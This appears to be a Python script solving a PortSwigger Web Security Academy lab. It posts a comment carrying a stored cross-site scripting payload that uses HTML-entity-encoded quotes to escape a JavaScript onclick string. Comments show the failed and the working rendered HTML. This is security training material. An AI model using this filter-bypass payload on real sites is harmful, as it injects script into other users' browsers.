# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
import requests

requests.packages.urllib3.disable_warnings()

verify = False
host = "acda1f971fa00e8180b849fa003400b4.web-security-academy.net"
path = "/post/comment"
scheme = "https://"
url = scheme + host + path
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
cookies = {"session": "mRq4a4FDtrb88iViQ37CWmaLuMEe13Gj"}
payload = scheme + "foo.com?&apos;-alert(1)-&apos;"
# payload = scheme + "foo.com?'-alert(1)-'"
data = {
    "csrf": "1YqAAvIesr2OTo03iayLvHX5vYmZZS5X",
    "postId": "5",
    "comment": "test",
    "name": "test",
    "email": "test@test.com",
    "website": payload,
}

requests.post(url, proxies=proxies, data=data, verify=verify, cookies=cookies)

# Unsuccessful payload
# <a id="author" href="https://foo.com?\'-alert(1)-\'" onclick="var tracker={track(){}};tracker.track('https://foo.com?\'-alert(1)-\'');">test</a>

# Successful payload
# <a id="author" href="https://foo.com?&apos;-alert(1)-&apos;" onclick="var tracker={track(){}};tracker.track('https://foo.com?&apos;-alert(1)-&apos;');">test</a>
